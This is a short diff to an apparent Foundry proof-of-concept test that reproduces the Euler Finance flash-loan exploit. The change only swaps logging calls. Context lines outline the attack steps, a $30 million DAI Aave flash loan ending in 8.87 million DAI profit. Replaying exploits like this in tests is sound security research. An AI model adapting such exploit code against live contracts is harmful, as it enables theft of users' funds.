@@ -36,7 +36,8 @@ contract EulerFinancePoC is Test {
     }
 
     function testExploit() public {
-        console.log("Attacker DAI balance before exploit", DAI.balanceOf(address(this)));
+        emit log_named_decimal_uint("Attacker DAI balance before exploit", DAI.balanceOf(address(this)), 18);
+        console.log(" ");
         // 1. Flash loan $30 million DAI
         uint256 aaveFlashLoanAmount = 30_000_000 * 1e18;
         address[] memory assets = new address[](1);
@@ -53,7 +54,8 @@ contract EulerFinancePoC is Test {
         // 10. attacker's balance > 30 million DAI borrowed + 27k DAI interest => loan repaid successfully automatically (else flashLoan would revert)
 
         // 8.87 million DAI profit!
-        console.log("Attacker DAI balance after exploit - attack profits:", DAI.balanceOf(address(this)));
+        emit log_named_decimal_uint("Attacker DAI balance after exploit", DAI.balanceOf(address(this)), 18);
+        console.log(" ");
     }
 
     function executeOperation(
